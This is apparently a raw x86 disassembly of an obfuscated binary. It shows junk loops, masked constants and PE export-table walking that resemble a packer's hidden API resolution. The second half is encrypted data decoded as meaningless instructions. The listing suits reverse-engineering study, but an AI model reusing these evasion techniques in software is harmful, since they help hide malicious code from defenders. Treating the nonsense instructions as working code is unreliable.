  4089b3:	cmp    edx,0x70941fd1
  4089b9:	jne    0x408a32
  4089bf:	cmp    esi,0xffffffff
  4089c2:	jne    0x408a32
  4089c8:	mov    edx,DWORD PTR ds:0x4219d6
  4089ce:	mov    esi,DWORD PTR ds:0x4219ce
  4089d4:	xor    edx,esi
  4089d6:	mov    DWORD PTR ds:0x4219ce,edx
  4089dc:	mov    edx,DWORD PTR [ebp+0xc]
  4089df:	mov    edx,DWORD PTR [edx]
  4089e1:	mov    edx,DWORD PTR [edx]
  4089e3:	mov    esi,DWORD PTR ds:0x4219ce
  4089e9:	add    DWORD PTR [edx],esi
  4089eb:	mov    esi,DWORD PTR [ebp+0x8]
  4089ee:	mov    edx,DWORD PTR ds:0x4219ce
  4089f4:	xor    esi,0x7510893
  4089fa:	add    esi,0x3272db
  408a00:	xor    ebx,ebx
  408a02:	add    esi,ecx
  408a04:	adc    ebx,0xffffffff
  408a07:	xor    edi,edi
  408a09:	xor    esi,eax
  408a0b:	xor    ebx,0x0
  408a0e:	add    edx,ecx
  408a10:	adc    edi,0xffffffff
  408a13:	xor    edx,eax
  408a15:	xor    edi,0x0
  408a18:	cmp    edx,esi
  408a1a:	jne    0x408a32
  408a20:	cmp    edi,ebx
  408a22:	jne    0x408a32
  408a28:	mov    eax,ds:0x4219ce
  408a2d:	mov    ds:0x4219d6,eax
  408a32:	pop    edi
  408a33:	pop    esi
  408a34:	pop    ebx
  408a35:	pop    ebp
  408a36:	ret    0x8
  408a39:	push   ebp
  408a3a:	mov    ebp,esp
  408a3c:	push   ecx
  408a3d:	mov    eax,ds:0x42179e
  408a42:	mov    eax,DWORD PTR [eax]
  408a44:	add    DWORD PTR ds:0x42901c,eax
  408a4a:	mov    DWORD PTR [ebp-0x4],0xf89c85b6
  408a51:	mov    eax,DWORD PTR [ebp+0x8]
  408a54:	adc    DWORD PTR ds:0x42a010,0x6bac
  408a5e:	mov    al,BYTE PTR [eax]
  408a60:	xor    DWORD PTR ds:0x42b018,0x428020
  408a6a:	add    al,0xd
  408a6c:	sbb    DWORD PTR ds:0x428004,0x428008
  408a76:	xor    al,0x6f
  408a78:	mov    DWORD PTR ds:0x428004,0x2e21
  408a82:	cmp    al,0x35
  408a84:	mov    DWORD PTR ds:0x42a00c,0x23cb
  408a8e:	jne    0x408b4b
  408a94:	and    DWORD PTR ds:0x428024,0x429014
  408a9e:	mov    eax,DWORD PTR [ebp+0x8]
  408aa1:	dec    edx
  408aa2:	mov    ecx,DWORD PTR [ebp+0x8]
  408aa5:	and    edx,DWORD PTR ds:0x42b010
  408aab:	add    ecx,DWORD PTR [eax+0x3c]
  408aae:	mov    edx,0x7510893
  408ab3:	mov    DWORD PTR [ebp+0x8],ecx
  408ab6:	and    DWORD PTR ds:0x42c008,0x0
  408ac0:	jmp    0x408ad2
  408ac5:	mov    ecx,DWORD PTR ds:0x42c008
  408acb:	inc    ecx
  408acc:	mov    DWORD PTR ds:0x42c008,ecx
  408ad2:	cmp    DWORD PTR ds:0x42c008,0x18
  408ad9:	jae    0x408b1d
  408adf:	cmp    DWORD PTR ds:0x42c008,0x9
  408ae6:	jne    0x408afc
  408aec:	push   0x429014
  408af1:	push   0x5ace
  408af6:	call   DWORD PTR ds:0x42403c
  408afc:	cmp    DWORD PTR ds:0x42c008,0x8
  408b03:	jne    0x408b18
  408b09:	xor    ecx,ecx
  408b0b:	or     ecx,DWORD PTR ds:0x42c008
  408b11:	inc    ecx
  408b12:	mov    DWORD PTR ds:0x42c008,ecx
  408b18:	jmp    0x408ac5
  408b1d:	mov    eax,DWORD PTR [ebp-0x4]
  408b20:	xor    eax,edx
  408b22:	push   esi
  408b23:	mov    esi,DWORD PTR [ebp+0x8]
  408b26:	mov    ecx,0x3272db
  408b2b:	add    eax,ecx
  408b2d:	cmp    DWORD PTR [esi+0x54],eax
  408b30:	pop    esi
  408b31:	je     0x408b3f
  408b37:	mov    eax,DWORD PTR [ebp+0x8]
  408b3a:	jmp    0x408b58
  408b3f:	mov    eax,DWORD PTR [ebp-0x4]
  408b42:	xor    eax,edx
  408b44:	add    eax,ecx
  408b46:	jmp    0x408b58
  408b4b:	mov    eax,DWORD PTR [ebp-0x4]
  408b4e:	xor    eax,0x7510893
  408b53:	add    eax,0x3272db
  408b58:	leave  
  408b59:	ret    0x4
  408b5c:	push   ebp
  408b5d:	mov    ebp,esp
  408b5f:	sub    esp,0x18
  408b62:	and    DWORD PTR ds:0x42901c,0x0
  408b6c:	jmp    0x408b7e
  408b71:	mov    edx,DWORD PTR ds:0x42901c
  408b77:	inc    edx
  408b78:	mov    DWORD PTR ds:0x42901c,edx
  408b7e:	cmp    DWORD PTR ds:0x42901c,0x1a
  408b85:	jae    0x408bb7
  408b8b:	cmp    DWORD PTR ds:0x42901c,0x22
  408b92:	jne    0x408ba8
  408b98:	push   0x8447
  408b9d:	push   0x423564
  408ba2:	call   DWORD PTR ds:0x424040
  408ba8:	jmp    0x408b71
  408bad:	adc    DWORD PTR ds:0x42b010,0x42b00c
  408bb7:	mov    DWORD PTR [ebp-0x10],0xf89f85b6
  408bbe:	mov    ecx,DWORD PTR ds:0x42176a
  408bc4:	mov    ecx,DWORD PTR [ecx]
  408bc6:	and    DWORD PTR ds:0x42c01c,ecx
  408bcc:	lea    eax,[ebp+0x14]
  408bcf:	mov    DWORD PTR [ebp-0x4],eax
  408bd2:	push   esi
  408bd3:	and    DWORD PTR ds:0x428018,0x0
  408bdd:	jmp    0x408bef
  408be2:	mov    esi,DWORD PTR ds:0x428018
  408be8:	inc    esi
  408be9:	mov    DWORD PTR ds:0x428018,esi
  408bef:	cmp    DWORD PTR ds:0x428018,0x1a
  408bf6:	jae    0x408cc4
  408bfc:	cmp    DWORD PTR ds:0x428018,0x28
  408c03:	jne    0x408c14
  408c09:	push   0x42357f
  408c0e:	call   DWORD PTR ds:0x424044
  408c14:	jmp    0x408be2
  408c19:	and    DWORD PTR ds:0x42c000,0x0
  408c23:	mov    edx,DWORD PTR ds:0x42c000
  408c29:	inc    edx
  408c2a:	mov    DWORD PTR ds:0x42c000,edx
  408c30:	cmp    DWORD PTR ds:0x42c000,0x20
  408c37:	jne    0x408c52
  408c3d:	push   0x1ea1
  408c42:	push   0x42b008
  408c47:	push   0x423642
  408c4c:	call   DWORD PTR ds:0x424048
  408c52:	cmp    DWORD PTR ds:0x42c000,0x11
  408c59:	jb     0x408c23
  408c5f:	and    DWORD PTR ds:0x42b004,0x0
  408c69:	mov    edx,DWORD PTR ds:0x42b004
  408c6f:	inc    edx
  408c70:	mov    DWORD PTR ds:0x42b004,edx
  408c76:	cmp    DWORD PTR ds:0x42b004,0xf
  408c7d:	jne    0x408c93
  408c83:	push   0x428004
  408c88:	push   0x7cc5
  408c8d:	call   DWORD PTR ds:0x424014
  408c93:	cmp    DWORD PTR ds:0x42b004,0xe
  408c9a:	jne    0x408cad
  408ca0:	mov    edx,DWORD PTR ds:0x42b004
  408ca6:	inc    edx
  408ca7:	mov    DWORD PTR ds:0x42b004,edx
  408cad:	cmp    DWORD PTR ds:0x42b004,0x1d
  408cb4:	jb     0x408c69
  408cba:	mov    DWORD PTR ds:0x428014,0x22a8
  408cc4:	mov    esi,0xf89c85b6
  408cc9:	and    DWORD PTR ds:0x428008,0x0
  408cd3:	mov    edx,DWORD PTR ds:0x428008
  408cd9:	inc    edx
  408cda:	mov    DWORD PTR ds:0x428008,edx
  408ce0:	cmp    DWORD PTR ds:0x428008,0x19
  408ce7:	jne    0x408d17
  408ced:	push   0x62e7
  408cf2:	push   0x428000
  408cf7:	push   0x75f3
  408cfc:	push   0x428000
  408d01:	push   DWORD PTR [ebp-0x24]
  408d04:	push   0x6458
  408d09:	push   DWORD PTR [ebp-0x14]
  408d0c:	push   0x5743
  408d11:	call   DWORD PTR ds:0x424018
  408d17:	cmp    DWORD PTR ds:0x428008,0x14
  408d1e:	jb     0x408cd3
  408d24:	xor    ecx,ecx
  408d26:	add    ecx,DWORD PTR ds:0x429008
  408d2c:	adc    DWORD PTR ds:0x42c00c,ecx
  408d32:	mov    DWORD PTR [ebp-0xc],esi
  408d35:	lea    eax,[ebp-0xc]
  408d38:	dec    ecx
  408d39:	mov    DWORD PTR [ebp-0x14],eax
  408d3c:	mov    eax,DWORD PTR [ebp-0xc]
  408d3f:	adc    ecx,0x29e6
  408d45:	mov    edx,DWORD PTR [ebp-0x14]
  408d48:	and    DWORD PTR ds:0x428018,0x0
  408d52:	mov    ecx,DWORD PTR ds:0x428018
  408d58:	inc    ecx
  408d59:	mov    DWORD PTR ds:0x428018,ecx
  408d5f:	cmp    DWORD PTR ds:0x428018,0xb
  408d66:	jne    0x408d77
  408d6c:	push   0x4faf
  408d71:	call   DWORD PTR ds:0x42401c
  408d77:	cmp    DWORD PTR ds:0x428018,0xa
  408d7e:	jne    0x408d91
  408d84:	mov    ecx,DWORD PTR ds:0x428018
  408d8a:	inc    ecx
  408d8b:	mov    DWORD PTR ds:0x428018,ecx
  408d91:	cmp    DWORD PTR ds:0x428018,0x1e
  408d98:	jb     0x408d52
  408d9e:	inc    ecx
  408d9f:	mov    ecx,0x7510893
  408da4:	neg    DWORD PTR ds:0x42a004
  408daa:	xor    eax,ecx
  408dac:	add    eax,0x3272db
  408db1:	and    DWORD PTR ds:0x42c010,0x2759
  408dbb:	mov    DWORD PTR [edx],eax
  408dbd:	mov    edx,DWORD PTR ds:0x421762
  408dc3:	mov    eax,ds:0x421772
  408dc8:	sub    edx,eax
  408dca:	and    edx,DWORD PTR [edx+eax*1]
  408dcd:	mov    eax,ds:0x4217ca
  408dd2:	inc    DWORD PTR ds:0x42a01c
  408dd8:	mov    edx,DWORD PTR [ebp-0x4]
  408ddb:	and    DWORD PTR ds:0x42a018,0x7b9c
  408de5:	mov    eax,DWORD PTR [eax]
  408de7:	and    DWORD PTR ds:0x42c000,0x5f81
  408df1:	add    eax,DWORD PTR [edx]
  408df3:	movzx  edx,BYTE PTR ds:0x42a014
  408dfa:	or     DWORD PTR ds:0x42a01c,edx
  408e00:	push   edi
  408e01:	add    DWORD PTR ds:0x42a004,edx
  408e07:	mov    DWORD PTR [ebp-0x8],eax
  408e0a:	movzx  edx,WORD PTR ds:0x428004
  408e11:	sbb    DWORD PTR ds:0x42a01c,edx
  408e17:	mov    edi,DWORD PTR [ebp+0x8]
  408e1a:	and    DWORD PTR ds:0x42b01c,0x631e
  408e24:	mov    eax,ds:0x421952
  408e29:	mov    eax,DWORD PTR [eax+0x198]
  408e2f:	xor    edi,ecx
  408e31:	mov    DWORD PTR ds:0x428018,0x14
  408e3b:	cmp    DWORD PTR ds:0x428018,0x0
  408e42:	je     0x408e95
  408e48:	cmp    DWORD PTR ds:0x428018,0x3
  408e4f:	jne    0x408e63
  408e55:	push   DWORD PTR [ebp-0x28]
  408e58:	push   0x77dc
  408e5d:	call   DWORD PTR ds:0x424020
  408e63:	cmp    DWORD PTR ds:0x428018,0x4
  408e6a:	jne    0x408e7d
  408e70:	mov    edx,DWORD PTR ds:0x428018
  408e76:	dec    edx
  408e77:	mov    DWORD PTR ds:0x428018,edx
  408e7d:	mov    edx,DWORD PTR ds:0x428018
  408e83:	dec    edx
  408e84:	mov    DWORD PTR ds:0x428018,edx
  408e8a:	jmp    0x408e3b
  408e8f:	and    DWORD PTR ds:0x42c014,ecx
  408e95:	mov    edx,0x3272db
  408e9a:	sbb    DWORD PTR ds:0x429008,0x451c
  408ea4:	add    edi,edx
  408ea6:	mov    DWORD PTR ds:0x42a000,0x2432
  408eb0:	cmp    DWORD PTR [eax],edi
  408eb2:	je     0x408ebf
  408eb8:	mov    eax,DWORD PTR [eax]
  408eba:	jmp    0x409144
  408ebf:	mov    eax,DWORD PTR [ebp+0x18]
  408ec2:	cmp    eax,esi
  408ec4:	jne    0x408ede
  408eca:	mov    DWORD PTR ds:0x42a01c,0x2296
  408ed4:	push   0xf89c85b5
  408ed9:	jmp    0x409133
  408ede:	mov    esi,DWORD PTR [ebp+0x18]
  408ee1:	mov    eax,0x2f4e
  408ee6:	mov    eax,0xf89c85b4
  408eeb:	cmp    esi,eax
  408eed:	jne    0x409123
  408ef3:	sbb    esi,esi
  408ef5:	mov    eax,DWORD PTR [ebp+0x10]
  408ef8:	mov    esi,DWORD PTR ds:0x42c008
  408efe:	sbb    esi,DWORD PTR ds:0x42a008
  408f04:	mov    DWORD PTR ds:0x42c008,esi
  408f0a:	xor    eax,ecx
  408f0c:	mov    DWORD PTR ds:0x428000,0x1b
  408f16:	cmp    DWORD PTR ds:0x428000,0x0
  408f1d:	je     0x408f86
  408f23:	cmp    DWORD PTR ds:0x428000,0x4
  408f2a:	jne    0x408f5a
  408f30:	push   0x42a000
  408f35:	push   0x8ffd
  408f3a:	push   DWORD PTR [ebp-0x14]
  408f3d:	push   0x428014
  408f42:	push   0x2d9f
  408f47:	push   0x4236bc
  408f4c:	push   0x4cf3
  408f51:	push   DWORD PTR [ebp-0x1c]
  408f54:	call   DWORD PTR ds:0x424024
  408f5a:	cmp    DWORD PTR ds:0x428000,0x5
  408f61:	jne    0x408f74
  408f67:	mov    esi,DWORD PTR ds:0x428000
  408f6d:	dec    esi
  408f6e:	mov    DWORD PTR ds:0x428000,esi
  408f74:	mov    esi,DWORD PTR ds:0x428000
  408f7a:	dec    esi
  408f7b:	mov    DWORD PTR ds:0x428000,esi
  408f81:	jmp    0x408f16
  408f86:	add    eax,edx
  408f88:	mov    DWORD PTR [ebp-0x18],eax
  408f8b:	mov    eax,DWORD PTR [ebp+0xc]
  408f8e:	mov    esi,DWORD PTR [ebp-0x8]
  408f91:	xor    eax,ecx
  408f93:	add    eax,edx
  408f95:	imul   eax,DWORD PTR [esi]
  408f98:	mov    esi,DWORD PTR [ebp+0x8]
  408f9b:	xor    esi,ecx
  408f9d:	add    esi,edx
  408f9f:	cmp    esi,eax
  408fa1:	mov    eax,DWORD PTR [ebp-0x4]
  408fa4:	push   ebx
  408fa5:	je     0x408fc4
  408fab:	mov    esi,DWORD PTR [ebp-0x18]
  408fae:	add    DWORD PTR [eax],esi
  408fb0:	mov    eax,DWORD PTR [ebp-0x4]
  408fb3:	mov    esi,DWORD PTR [ebp+0xc]
  408fb6:	xor    esi,ecx
  408fb8:	add    esi,edx
  408fba:	imul   esi,DWORD PTR [eax]
  408fbd:	mov    DWORD PTR [eax],esi
  408fbf:	jmp    0x408fc9
  408fc4:	mov    esi,DWORD PTR [ebp+0x14]
  408fc7:	xor    DWORD PTR [eax],esi
  408fc9:	mov    eax,DWORD PTR [ebp-0x4]
  408fcc:	mov    edi,DWORD PTR [ebp+0x10]
  408fcf:	xor    edi,ecx
  408fd1:	mov    esi,0xffcd8d25
  408fd6:	mov    ebx,esi
  408fd8:	sub    ebx,edi
  408fda:	add    DWORD PTR [eax],ebx
  408fdc:	mov    eax,DWORD PTR [ebp-0x4]
  408fdf:	mov    edi,DWORD PTR [ebp-0x8]
  408fe2:	add    edi,DWORD PTR [eax]
  408fe4:	mov    DWORD PTR [ebp-0x8],edi
  408fe7:	mov    eax,DWORD PTR [ebp+0xc]
  408fea:	mov    edi,DWORD PTR [ebp+0xc]
  408fed:	xor    edi,ecx
  408fef:	xor    eax,ecx
  408ff1:	lea    eax,[eax+edi*1+0x64e5b6]
  408ff8:	mov    edi,DWORD PTR [ebp+0xc]
  408ffb:	xor    edi,ecx
  408ffd:	add    edi,edx
  408fff:	imul   eax,edi
  409002:	mov    edi,DWORD PTR [ebp+0xc]
  409005:	xor    edi,ecx
  409007:	sub    edi,eax
  409009:	mov    eax,DWORD PTR [ebp-0x4]
  40900c:	add    edi,edx
  40900e:	cmp    DWORD PTR [eax],edi
  409010:	mov    eax,DWORD PTR [ebp-0x4]
  409013:	mov    edi,DWORD PTR [ebp+0x10]
  409016:	jg     0x409029
  40901c:	xor    edi,ecx
  40901e:	mov    ebx,esi
  409020:	sub    ebx,edi
  409022:	add    DWORD PTR [eax],ebx
  409024:	jmp    0x40902f
  409029:	xor    edi,ecx
  40902b:	add    edi,edx
  40902d:	add    DWORD PTR [eax],edi
  40902f:	mov    eax,DWORD PTR [ebp-0x8]
  409032:	mov    edi,DWORD PTR [ebp-0x10]
  409035:	mov    eax,DWORD PTR [eax]
  409037:	xor    edi,ecx
  409039:	add    edi,0x3272da
  40903f:	not    edi
  409041:	and    eax,edi
  409043:	movsx  di,BYTE PTR [eax+0x1]
  409048:	mov    ebx,0x3b4b
  40904d:	sub    di,bx
  409050:	mov    ebx,0x8a85
  409055:	xor    di,bx
  409058:	mov    ebx,0x4f8a
  40905d:	cmp    di,bx
  409060:	jne    0x409088
  409066:	movsx  di,BYTE PTR [eax]
  40906a:	mov    ebx,0x3b4b
  40906f:	sub    di,bx
  409072:	mov    ebx,0x8a85
  409077:	xor    di,bx
  40907a:	mov    ebx,0x4f87
  40907f:	cmp    di,bx
  409082:	je     0x409098
  409088:	mov    edi,DWORD PTR [ebp-0x10]
  40908b:	xor    edi,ecx
  40908d:	mov    ebx,esi
  40908f:	sub    ebx,edi
  409091:	add    eax,ebx
  409093:	jmp    0x409043
  409098:	mov    esi,DWORD PTR [ebp-0x14]
  40909b:	mov    esi,DWORD PTR [esi]
  40909d:	mov    edi,DWORD PTR [eax+0x3c]
  4090a0:	lea    esi,[edi+esi*8+0x78]
  4090a4:	mov    esi,DWORD PTR [esi+eax*1]
  4090a7:	mov    DWORD PTR [ebp-0x8],esi
  4090aa:	mov    esi,DWORD PTR [ebp+0x8]
  4090ad:	xor    esi,ecx
  4090af:	add    esi,edx
  4090b1:	mov    DWORD PTR [ebp-0x14],esi
  4090b4:	mov    esi,DWORD PTR [ebp+0x8]
  4090b7:	mov    edi,DWORD PTR [ebp-0x8]
  4090ba:	xor    esi,ecx
  4090bc:	add    esi,edx
  4090be:	pop    ebx
  4090bf:	cmp    edi,esi
  4090c1:	jne    0x4090df
  4090c7:	mov    eax,DWORD PTR [ebp+0xc]
  4090ca:	xor    eax,ecx
  4090cc:	mov    ecx,DWORD PTR [ebp-0x8]
  4090cf:	add    eax,edx
  4090d1:	imul   eax,ecx
  4090d4:	mov    DWORD PTR [ebp-0x8],eax
  4090d7:	push   DWORD PTR [ebp+0x18]
  4090da:	jmp    0x409133
  4090df:	mov    ecx,DWORD PTR [ebp-0x8]
  4090e2:	add    ecx,eax
  4090e4:	mov    DWORD PTR [ebp-0x14],ecx
  4090e7:	mov    ecx,DWORD PTR [ebp-0x14]
  4090ea:	mov    ecx,DWORD PTR [ecx+0xc]
  4090ed:	movsx  cx,BYTE PTR [ecx+eax*1]
  4090f2:	mov    edx,0x3b4b
  4090f7:	sub    cx,dx
  4090fa:	mov    edx,0x8a85
  4090ff:	xor    cx,dx
  409102:	mov    edx,0x4f85
  409107:	cmp    cx,dx
  40910a:	jne    0x4090d7
  409110:	mov    ecx,DWORD PTR ds:0x421952
  409116:	mov    ecx,DWORD PTR [ecx+0x198]
  40911c:	mov    DWORD PTR [ecx],eax
  40911e:	jmp    0x409144
  409123:	mov    ecx,DWORD PTR [ebp+0x18]
  409126:	cmp    ecx,0xf89c85b5
  40912c:	jne    0x409144
  409132:	push   eax
  409133:	push   DWORD PTR [ebp+0x14]
  409136:	push   DWORD PTR [ebp+0x10]
  409139:	push   DWORD PTR [ebp+0xc]
  40913c:	push   DWORD PTR [ebp+0x8]
  40913f:	call   0x408b5c
  409144:	pop    edi
  409145:	pop    esi
  409146:	leave  
  409147:	ret    0x14
  40914a:	push   ebp
  40914b:	mov    ebp,esp
  40914d:	push   ecx
  40914e:	mov    DWORD PTR [ebp-0x4],0xf89c85ba
  409155:	mov    eax,DWORD PTR [ebp-0x4]
  409158:	mov    ecx,DWORD PTR ds:0x42b010
  40915e:	sbb    DWORD PTR ds:0x42a018,ecx
  409164:	mov    edx,DWORD PTR [ebp+0x10]
  409167:	mov    DWORD PTR ds:0x42801c,0x4950
  409171:	mov    ecx,0x7510893
  409176:	sbb    DWORD PTR ds:0x428028,0x4a48
  409180:	xor    eax,ecx
  409182:	add    DWORD PTR ds:0x42b000,0x42800c
  40918c:	add    eax,0x3272db
  409191:	mov    DWORD PTR ds:0x42a014,0x169
  40919b:	mov    DWORD PTR [edx],eax
  40919d:	sbb    eax,edx
  40919f:	mov    eax,DWORD PTR [ebp+0xc]
  4091a2:	xor    eax,ecx
  4091a4:	inc    edx
  4091a5:	push   esi
  4091a6:	xor    esi,edx
  4091a8:	mov    esi,DWORD PTR [ebp+0x10]
  4091ab:	mov    edx,0x3272db
  4091b0:	add    eax,edx
  4091b2:	add    DWORD PTR ds:0x42b01c,0x428020
  4091bc:	mov    DWORD PTR [esi+0x4],eax
  4091bf:	mov    eax,DWORD PTR [ebp+0x14]
  4091c2:	mov    esi,DWORD PTR ds:0x428024
  4091c8:	sbb    esi,DWORD PTR ds:0x429010
  4091ce:	mov    DWORD PTR ds:0x428024,esi
  4091d4:	mov    esi,DWORD PTR [ebp+0x10]
  4091d7:	mov    DWORD PTR [esi+0x8],eax
  4091da:	mov    eax,DWORD PTR [ebp+0x18]
  4091dd:	mov    esi,DWORD PTR [ebp+0x10]
  4091e0:	mov    DWORD PTR [esi+0xc],eax
  4091e3:	mov    eax,DWORD PTR [ebp+0x1c]
  4091e6:	mov    esi,DWORD PTR [ebp+0x10]
  4091e9:	mov    DWORD PTR [esi+0x10],eax
  4091ec:	mov    eax,DWORD PTR [ebp+0x8]
  4091ef:	xor    eax,ecx
  4091f1:	add    eax,edx
  4091f3:	pop    esi
  4091f4:	leave  
  4091f5:	ret    0x18
  4091f8:	push   ebp
  4091f9:	mov    ebp,esp
  4091fb:	sub    esp,0x94
  409201:	mov    eax,DWORD PTR [ebp+0x8]
  409204:	push   ebx
  409205:	neg    ecx
  409207:	jmp    0x40b57c
  40920c:	mov    dl,0xcf
  40920e:	enter  0x872f,0x27
  409212:	imul   ebp,DWORD PTR [edi+0x65],0x4fd7ebdc
  409219:	cli    
  40921a:	jmp    0x625939d4
  40921f:	bound  ecx,QWORD PTR [edx]
  409221:	pop    edi
  409222:	bound  esp,QWORD PTR [edx+0x35]
  409225:	sub    DWORD PTR [edi+eax*2],ebx
  409228:	push   esi
  409229:	pop    ebx
  40922a:	ret    0x5a22
  40922d:	fmul   QWORD PTR [ecx+ecx*2-0x40]
  409231:	(bad)  
  409233:	mov    ecx,0xa5d5146f
  409238:	(bad)  [ebx]
  40923a:	jo     0x409284
  40923c:	loop   0x4091f9
  40923e:	jge    0x4091e6
  409240:	push   ecx
  409241:	lock inc edi
  409243:	jecxz  0x409215
  409245:	in     al,dx
  409246:	sub    BYTE PTR [ebp+0x60],ch
  409249:	mov    ah,dh
  40924b:	stos   DWORD PTR es:[edi],eax
  40924c:	ins    BYTE PTR es:[edi],dx
  40924d:	xchg   edx,eax
  40924e:	pop    ss
  40924f:	mov    ah,0xa9
  409251:	mov    esi,0xc28a4d52
  409256:	mov    DWORD PTR [ecx],ebx
  409258:	push   0xf6957d68
  40925d:	(bad)  
  40925e:	les    edi,FWORD PTR [edi-0x65]
  409261:	or     al,0x75
  409263:	push   ebx
  409264:	ja     0x4091e8
  409266:	outs   dx,BYTE PTR ds:[esi]
  409267:	push   ecx
  409268:	inc    ebp
  409269:	cli    
  40926a:	repnz (bad) 
  40926c:	mov    BYTE PTR [edx+0x6e],0x6e
  409270:	xor    al,0x3a
  409272:	cmp    ch,ch
  409274:	xor    esi,DWORD PTR [edi+0x5b]
  409277:	inc    edi
  409278:	adc    eax,0x3d5505f9
  40927d:	jg     0x4092f6
  40927f:	outs   dx,BYTE PTR ds:[esi]
  409280:	and    DWORD PTR ds:0xf49f1466,esi
  409286:	xchg   edx,eax
  409287:	push   esp
  409288:	cs pop esi
  40928a:	or     al,BYTE PTR [esi]
  40928c:	pop    ds
  40928d:	jg     0x4092d1
  40928f:	cdq    
  409290:	sub    al,0x8f
  409292:	mov    bh,0xd0
  409294:	retf   0x9d50
  409297:	icebp  
  409298:	stc    
  409299:	add    al,0x8e
  40929b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40929c:	add    dh,cl
  40929e:	inc    esi
  40929f:	sti    
  4092a0:	adc    dh,al
  4092a2:	(bad)  [esi]
  4092a4:	sahf   
  4092a5:	call   0xa587:0x20063b26
  4092ac:	lahf   
  4092ad:	test   eax,0x1a9c8a75
  4092b2:	ds xchg esp,eax
  4092b4:	jns    0x40928e
  4092b6:	pusha  
  4092b7:	and    eax,0xf9b63871
  4092bc:	jne    0x409283
  4092be:	mov    ebx,esi
  4092c0:	int    0xda
  4092c2:	add    eax,0x15e0fe44
  4092c7:	arpl   WORD PTR [ecx+0x76064382],dx
  4092cd:	ins    DWORD PTR es:[edi],dx
  4092ce:	mov    dh,0xf
  4092d0:	sahf   
  4092d1:	push   esp
  4092d2:	pop    edx
  4092d3:	mov    dh,0xaa
  4092d5:	shr    BYTE PTR [esi+0x62],cl
  4092d8:	mov    al,0x1
  4092da:	mov    ebp,0x2d83dde3
  4092df:	push   esp
  4092e0:	jne    0x4092b7
  4092e2:	sbb    DWORD PTR [eax+0x2f],edx
  4092e5:	add    DWORD PTR [edx],edi
  4092e7:	imul   ecx,DWORD PTR [ebx-0x61],0x6d4a44a7
  4092ee:	ja     0x4092e7
  4092f0:	das    
  4092f1:	scas   al,BYTE PTR es:[edi]
  4092f2:	test   eax,0x9d8b34f
  4092f7:	ret    
  4092f8:	das    
  4092f9:	dec    ebx
  4092fa:	out    dx,al
  4092fb:	clc    
  4092fc:	dec    eax
  4092fd:	jmp    0x11457325
  409302:	subps  xmm5,XMMWORD PTR [eax+0x64ae6592]
  409309:	int3   
  40930a:	es pop esp
  40930c:	push   0xc6c9c43a
  409311:	jmp    0x4092d8
  409313:	xor    DWORD PTR [eax-0x70],0x5c3c1444
  40931a:	popa   
  40931b:	and    al,0x2a
  40931d:	loopne 0x409391
  40931f:	cmp    al,cl
  409321:	push   si
  409323:	sub    eax,0x23124ec
  409328:	sbb    eax,0xd924c02b
  40932d:	jno    0x4092dc
  40932f:	jne    0x4092f1
  409331:	add    cl,BYTE PTR [eax+ebp*1+0x4d]
  409335:	xor    ah,cl
  409337:	cli    
  409338:	ja     0x4093ac
  40933a:	mov    eax,0x88672bd4
  40933f:	aam    0x76
  409341:	dec    ebp
  409342:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409343:	inc    eax
  409344:	pop    esp
  409345:	cli    
  409346:	daa    
  409347:	sahf   
  409348:	fsubrp st(4),st
  40934a:	sbb    eax,0x27e309d7
  40934f:	mov    ds:0x2fce285a,al
  409354:	push   ds
  409355:	pop    ebx
  409357:	cmp    BYTE PTR [ebp-0x10],dh
  40935a:	cmp    esp,DWORD PTR [ecx-0x17fd3f48]
  409360:	push   ss
  409361:	sbb    al,0x93
  409363:	sar    BYTE PTR [esi-0x3a7a1e44],1
  409369:	out    dx,al
  40936a:	pop    edx
  40936b:	add    ebp,DWORD PTR [ebx+0x1f]
  40936e:	jmp    0x409395
  409370:	in     al,dx
  409371:	call   0xf44c:0xa06a51e2
  409378:	fdivr  QWORD PTR [edi+ecx*2-0x65509bd9]
  40937f:	sbb    BYTE PTR [ecx-0x5a],ah
  409382:	jnp    0x40935e
  409384:	mov    DWORD PTR [edx+0x17214e7b],edi
  40938a:	and    cl,BYTE PTR [edi]
  40938c:	inc    esp
  40938d:	sub    al,0x34
  40938f:	add    eax,0xb087eb8d
  409394:	cmp    ebx,DWORD PTR [ecx+0x63936cc2]
  40939a:	cmp    ebp,DWORD PTR [edi+eax*4-0x34547dac]
  4093a1:	nop
  4093a2:	(bad)  
  4093a3:	mov    dh,0xff
  4093a5:	cs stc 
  4093a7:	xchg   edx,eax
  4093a8:	dec    edx
  4093a9:	lea    esi,[edx]
  4093ab:	jnp    0x409423
  4093ad:	and    al,0xe2
  4093af:	adc    edi,DWORD PTR [esi+ecx*1+0x38583ced]
  4093b6:	arpl   bx,dx
  4093b8:	repnz pushf 
  4093ba:	mov    al,0xd8
  4093bc:	inc    ebp
  4093bd:	call   0x1a889b27
  4093c2:	add    eax,0xdb7437c3
  4093c7:	push   eax
  4093c8:	arpl   cx,bx
  4093ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4093cb:	pusha  
  4093cc:	xchg   esp,eax
  4093cd:	mov    ecx,0x5b9337b3
  4093d2:	iret   
  4093d3:	pusha  
  4093d4:	es pushw ds
  4093d7:	psubsb mm3,QWORD PTR [eax+0x17d5e56a]
  4093de:	inc    esp
  4093df:	rol    DWORD PTR [eax],1
  4093e1:	ins    DWORD PTR es:[edi],dx
  4093e2:	jmp    0x360c333c
  4093e7:	adc    al,0x9b
  4093e9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4093ea:	pop    ebp
  4093eb:	std    
  4093ec:	fldpi  
  4093ee:	(bad)  
  4093f0:	aas    
  4093f1:	bound  eax,QWORD PTR [esi]
  4093f3:	xlat   BYTE PTR ds:[ebx]
  4093f4:	arpl   cx,dx
  4093f6:	sbb    bl,BYTE PTR [edi+0x5c]
  4093f9:	sub    al,BYTE PTR [edx+edx*1-0x20a1c6b7]
  409400:	xor    al,0xd1
  409402:	dec    eax
  409403:	or     BYTE PTR [esp+ebp*4-0x219e6a0a],al
  40940a:	and    al,0x3e
  40940c:	sub    cl,ch
  40940e:	fbstp  TBYTE PTR [edx]
  409410:	jmp    0x5ea91f6f
  409415:	shr    bh,cl
  409417:	push   ebp
  409418:	mov    ebp,0x2ce27a06
  40941d:	inc    ebx
  40941e:	jmp    0x2061:0x3c1c9f3a
  409425:	xchg   bl,dl
  409427:	cli    
  409428:	pushf  
  409429:	cmp    dh,BYTE PTR [ebx-0x70]
  40942c:	push   ss
  40942d:	das    
  40942e:	inc    esi
